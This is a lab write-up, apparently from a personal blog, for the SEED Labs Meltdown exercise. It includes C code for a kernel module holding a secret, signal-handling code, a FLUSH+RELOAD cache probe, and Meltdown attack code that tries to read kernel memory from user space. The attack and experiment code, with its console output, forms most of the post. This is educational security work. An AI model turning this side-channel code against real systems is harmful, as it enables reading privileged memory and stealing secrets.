---
layout:             post
title:              "SEED Labs 2.0: Meltdown Attack Lab Writeup"
category:           "Hardware Security"
tags:               hardware-security microarchitecture cache
permalink:          /blog/seedlabs/meltdown
last_modified_at:   "2022-11-11"
---

For general overview and the setup package for this lab, please go to [SEED Labs official website](https://seedsecuritylabs.org). The lab assignment was conducted using SEED virtual machine configured on a AWS EC2 instance. On the SEED Ubuntu 20.04 VM, Tasks 1 to 6 still work as expected, but Tasks 7 and 8 will not work due to the countermeasures implemented inside the OS.

Please refer to [this post]({{ site.baseurl }}/blog/seedlabs/system-security) for detailed explanations of Tasks 1 and 2.

<!-- excerpt-end -->

## Table of Contents
{:.no_toc}
* TOC 
{:toc}

## Preparation for the Meltdown Attack

Memory isolation is achieved by a supervisor bit of the processor that defines whether a memory page of the kernel can be accessed or not. The bit is set when CPU enters the kernel space and cleared when it exits to the user space. With this feature, kernel memory can be safely mapped into the address space of every process, so the page table does not need to change when a user-level program traps into the kernel.

### Place Secret Data in Kernel Space

We put out own secret in the kernel, and then see whether we can use a userspace program to read the secret.

```c
/* MeltdownKernel.c */
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/vmalloc.h> /* for vmalloc() */
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/fs.h>

static char secret[10] = {'L', 'o', 'c', 'h', 'L', 'o', 'm', 'o', 'n', 'd'};
static struct proc_dir_entry *secret_entry;
static char* secret_buffer;

static int test_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, NULL, PDE_DATA(inode));
}

/* read_proc() does not return the secret data to the user space,
 * so it does not leak the secret data.
 */
static ssize_t read_proc(struct file *fp, char *buffer, size_t length, loff_t *offset)
{
    /* load secret variable, which is cached by the CPU */
    memcpy(secret_buffer, &secret, 10);
    return 10;
}

static const struct file_operations test_proc_fops =
{
    .owner = THIS_MODULE,
    .open = test_proc_open,
    .read = read_proc,
    .llseek = seq_lseek,
    .release = single_release,
};

static int test_proc_init(void)
{
    /* write message in kernel message buffer, which is publicly accessible */
    printk(KERN_INFO "secret data address: %p\n", &secret);

    secret_buffer = (char *)vmalloc(10);

    /* create data entry: /proc/secret_data
     * When a user-level program reads from this entry,
     * the read_proc() function will be invoked,
     * inside which the secret variable will be loaded.
     */
    secret_entry = proc_create_data("secret_data", 0444, NULL, (const struct proc_ops *)&test_proc_fops, NULL);
    if (secret_entry) return 0;

    return -ENOMEM;
}

static void test_proc_cleanup(void)
{
    remove_proc_entry("secret_data", NULL);
}

module_init(test_proc_init);
module_exit(test_proc_cleanup);


MODULE_LICENSE ("GPL");
MODULE_AUTHOR ("SEED Labs 2.0");
MODULE_DESCRIPTION ("Meltdown");
```

We need this <code>Makefile</code>
```make
KVERS = $(shell uname -r)
obj-m += MeltdownKernel.o
build: kernel_modules
kernel_modules:
        make -C /lib/modules/$(KVERS)/build M=$(CURDIR) modules
```
to compile the above program into a kernel module:
```console
$ make
make -C /lib/modules/5.15.0-1022-aws/build M=/home/seed/Documents/Meltdown modules
make[1]: Entering directory '/usr/src/linux-headers-5.15.0-1022-aws'
  CC [M]  /home/seed/Documents/Meltdown/MeltdownKernel.o
  MODPOST /home/seed/Documents/Meltdown/Module.symvers
  CC [M]  /home/seed/Documents/Meltdown/MeltdownKernel.mod.o
  LD [M]  /home/seed/Documents/Meltdown/MeltdownKernel.ko
  BTF [M] /home/seed/Documents/Meltdown/MeltdownKernel.ko
Skipping BTF generation for /home/seed/Documents/Meltdown/MeltdownKernel.ko due to unavailability of vmlinux
make[1]: Leaving directory '/usr/src/linux-headers-5.15.0-1022-aws'
```

Install the kernel module and find the secret data's address from the kernel message buffer:
```console
$ sudo insmod MeltdownKernel.ko
$ sudo lsmod | grep Meltdown
MeltdownKernel         16384  0
$ sudo dmesg | grep 'secret data address'
[  936.887248] secret data address: 00000000fd2aab32
```

### Access Kernel Memory from User Space

First, let's see if we can directly get the secret from the address obtained from above.

```c
/* get-secret-test.c */
#include <stdio.h>

int main()
{
        char *kernel_data_addr = (char *)0xfd2aab32;
        char kernel_data = *kernel_data_addr;
        printf("I have reached here.\n");
        return 0;
}
```

Compile and run the simple userspace program:
```console
$ gcc get-secret-test.c -o get-secret-test
$ ./get-secret-test
Segmentation fault (core dumped)
```

Due to access control, I received a segmentation fault. The reason is that, in computer systems, accessing prohibited memory location will cause a <code>SIGSEGV</code> signal to be raised; if a program does not handle this exception by itself, the operating system will handle it and terminate the program. Based on this knowledge, let's define our own signal handler so that the program can continue to execute even if there is a critical exception:
```c
/* ExceptionHandling.c */
#define _POSIX_SOURCE
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>

static sigjmp_buf jbuf;

static void catch_segv()
{
        /* Roll back to the checkpoint set by sigsetjmp() */
        siglongjmp(jbuf, 1);
}

int main()
{
        /* The address of our secret data */
        unsigned long kernel_data_addr = 0xfd2aab32;

        /* Register a signal handler */
        signal(SIGSEGV, catch_segv);

        if (sigsetjmp(jbuf, 1) == 0) {
                /* A SIGSEGV signal will be raised */
                char kernel_data = *(char *)kernel_data_addr;
                /* The following statement will not be executed */
                printf("Kernel data at address 0x%lu is: %c\n", kernel_data_addr, kernel_data);
        } else {
                printf("Memory access violation!\n");
        }

        printf("Program continues to execute.\n");

        return 0;
}
```
In the above program, the <code>sigjmp_buf</code> structure is identical to <code>jmp_buf</code>. The <code>sigsetjmp()</code> and <code>siglongjmp()</code> functions provide a way to perform a nonlocal <code>goto</code>. A call to <code>sigsetjmp()</code> causes the current stack environment including the signal mask to be saved in <code>env</code>. The exception handler <code>catch_segv()</code> calls <code>siglongjmp()</code>, which stores all the stack environment along with the signal mask previously saved by <code>sigsetjmp()</code>, and returns control to a point in the program corresponding to the <code>sigsetjmp()</code> call.
```c
/*
 *        ISO C99 Standard: 7.13 Nonlocal jumps        <setjmp.h>
 */

#ifdef        __USE_POSIX
/* Use the same type for `jmp_buf' and `sigjmp_buf'.
   The `__mask_was_saved' flag determines whether
   or not `longjmp' will restore the signal mask.  */
typedef struct __jmp_buf_tag sigjmp_buf[1];

/* Store the calling environment in ENV, also saving the
   signal mask if SAVEMASK is nonzero.  Return 0.  */
# define sigsetjmp(env, savemask)        __sigsetjmp (env, savemask)

/* Jump to the environment saved in ENV, making the
   sigsetjmp call there return VAL, or 1 if VAL is 0.
   Restore the signal mask if that sigsetjmp call saved it.
   This is just an alias `longjmp'.  */
extern void siglongjmp (sigjmp_buf __env, int __val)
     __THROW __attribute__ ((__noreturn__));
#endif /* Use POSIX.  */
```
The returned value of the <code>sigsetjmp()</code> function is the second argument of the <code>siglongjmp()</code> function, which is <code>1</code> in our case. Therefore, after the exception handling, program continues its execution from the false-branch. Compile and run the exception handling program:

```console
$ gcc ExceptionHandling.c -o ExceptionHandling
$ ./ExceptionHandling
Memory access violation!
Program continues to execute.
```

## Out-of-Order Execution by CPU

Let's use an experiment (<code>MeltdownExperiment.c</code>) to observe the effect caused by an out-of-order execution:
```c
/* MeltdownExperiment.c */
#define _POSIX_SOURCE
#include <setjmp.h>
#include <signal.h>
#include <x86intrin.h>
#include <stdint.h>
#include <stdio.h>

uint8_t array[256 * 4096];
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

void meltdown(unsigned long kernel_data_addr)
{
    char kernel_data = 0;
    /* The following statemnet will cause an exception */
    kernel_data = *(char *)kernel_data_addr;
    array[7 * 4096 + DELTA] += 1;
}

/* Signal handler*/
static sigjmp_buf jbuf;
static void catch_segv()
{
    siglongjmp(jbuf, 1);
}

int main()
{
    /* Register a signal handler */
    signal(SIGSEGV, catch_segv);

    /* Flush the probing array */
    flushSideChannel();

    if (sigsetjmp(jbuf, 1) == 0) {
        meltdown(0xfd2aab32);
    } else {
        printf("Memory access violation!\n");
    }

    /* Reload the probing array */
    reloadSideChannel();

    return 0;
}
```

Compile the above program and run it multiple times:
```console
$ gcc -march=native MeltdownExperiment.c -o MeltdownExperiment
$ ./MeltdownExperiment
Memory access violation!
array[7 * 4096 + 1024] is in cache!
The secret is 7.
$ ./MeltdownExperiment
Memory access violation!
array[7 * 4096 + 1024] is in cache!
The secret is 7.
$ ./MeltdownExperiment
Memory access violation!
array[7 * 4096 + 1024] is in cache!
The secret is 7.
$ ./MeltdownExperiment
Memory access violation!
array[7 * 4096 + 1024] is in cache!
The secret is 7.
$ ./MeltdownExperiment
Memory access violation!
```
The last run reveals the noisy nature of this side channel.

## Launch the Meltdown Attack

Before triggering the out-of-order execution, we need to get the kernel secret data cached. Use the following code:
```c
#define _XOPEN_SOURCE 500
#include <setjmp.h>
#include <signal.h>
#include <fcntl.h>      /* For open() */
#include <x86intrin.h>
#include <unistd.h>     /* For pread() */
#include <stdint.h>
#include <stdio.h>

uint8_t array[256 * 4096];
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

void meltdown(unsigned long kernel_data_addr)
{
    char kernel_data = 0;
    /* The following statemnet will cause an exception */
    kernel_data = *(char *)kernel_data_addr;
    // array[7 * 4096 + DELTA] += 1;
    array[kernel_data * 4096 + DELTA] += 1;
}

/* Signal handler*/
static sigjmp_buf jbuf;
static void catch_segv()
{
    siglongjmp(jbuf, 1);
}

int main()
{
    /* Register a signal handler */
    signal(SIGSEGV, catch_segv);

    /* Flush the probing array */
    flushSideChannel();

    /* Textbook Section 13.5.2: We need to get the kernel secret data cached */
    /* First, open the /proc/secret_data virtual file */
    int fd = open("/proc/secret_data", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    /* Then, cause the secret data to be cached */
    ssize_t ret = pread(fd, NULL, 0, 0);

    if (sigsetjmp(jbuf, 1) == 0) {
        meltdown(0xfd2aab32);
    } else {
        printf("Memory access violation!\n");
    }

    /* Reload the probing array */
    reloadSideChannel();

    return 0;
}
```

Compile and run it:
```console
$ gcc -march=native MeltdownExperiment.c -o MeltdownExperiment
$ ./MeltdownExperiment
Killed
```